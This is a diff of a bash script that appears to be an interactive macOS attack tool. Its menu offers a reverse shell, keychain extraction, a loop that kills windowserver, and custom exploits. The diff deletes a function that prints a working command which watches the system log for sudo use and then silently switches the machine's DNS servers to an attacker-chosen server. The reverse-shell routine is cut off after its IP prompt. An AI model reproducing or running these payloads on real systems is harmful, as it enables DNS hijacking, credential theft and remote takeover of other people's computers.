@@ -44,14 +44,12 @@ function configure {
     printf "    [$(tput bold)R$(tput sgr0)]everse Shell\n\
     [$(tput bold)K$(tput sgr0)]eychain extraction\n\
     [$(tput bold)T$(tput sgr0)]ermination loop for windowserver for fun and profit\n\
-    [$(tput bold)D$(tput sgr0)]omain server switch\n\
     [$(tput bold)C$(tput sgr0)]ustom exploit\n\n    "
     read -r -sn1 key
     case "$key" in
             [rR]) reverseshell;;
             [tT]) killloop;;
             [kK]) keychainextraction;;
-            [dD]) domainserver;;
             [cC]) customexploit;;
     esac
 }
@@ -72,15 +70,6 @@ function customexploit {
    menu
 }
 
-function domainserver {
-   printf "enter a network service: "
-   read networkservice
-   printf "    enter a DNS server: "
-   read dns
-   echo "    $(tput bold)exploit:$(tput sgr0) tail -F -n 0 /var/log/system.log | grep --line-buffered sudo | while read ; do sudo networksetup -setdnsservers $networkservice $dns; done"
-   echo ""
-   menu
-}
 
 function reverseshell {
   printf "enter an ip for the reverse shell: "
